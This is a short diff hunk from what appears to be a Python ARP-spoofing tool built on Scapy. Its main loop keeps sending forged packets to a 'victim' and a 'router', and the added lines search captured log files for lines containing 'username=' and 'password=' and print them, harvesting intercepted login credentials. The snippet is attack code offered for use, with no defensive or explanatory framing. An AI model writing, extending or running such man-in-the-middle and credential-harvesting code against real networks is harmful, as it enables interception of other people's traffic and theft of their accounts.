@@ -182,8 +182,17 @@ if __name__ == "__main__":
 
     try:
         while(1):
+            # verbose=0 : make the function totally silent
+            # More : help(send)
+            # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
             send(victimpacket, verbose=0)
             send(routerpacket, verbose=0)
+
+            for file in os.listdir("logdir/"):
+                with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        if ('username=' in line) and ("password=" in line):
+                            print("Find: ", line)
             sleep(2)
     finally:
         print("Done")
